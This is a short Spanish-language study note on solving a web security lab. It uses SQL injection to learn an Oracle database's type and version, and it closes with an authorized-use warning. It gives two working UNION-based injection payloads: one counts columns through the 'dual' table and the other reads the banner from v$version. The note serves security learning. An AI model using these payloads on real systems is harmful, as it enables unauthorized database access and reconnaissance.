---
title: "6 - SQL injection attack, querying the database type and version on Oracle"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

Tenemos el siguiente laboratorio:
![[Pasted image 20240511230435.png]]
Vamos a determinar el número columnas de la tabla y las columnas que tienen información:
```bash
'+UNION+SELECT+'abc','def'+FROM+dual--
```
![[Pasted image 20240511230545.png]]
Y vemos lo siguiente:
![[Pasted image 20240511230602.png]]
Y ahora usamos el siguiente payload:
```bash
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```
![[Pasted image 20240511230632.png]]
Lo ejecutamos y ya tenemos el laboratorio resuelto:
![[Pasted image 20240511230654.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
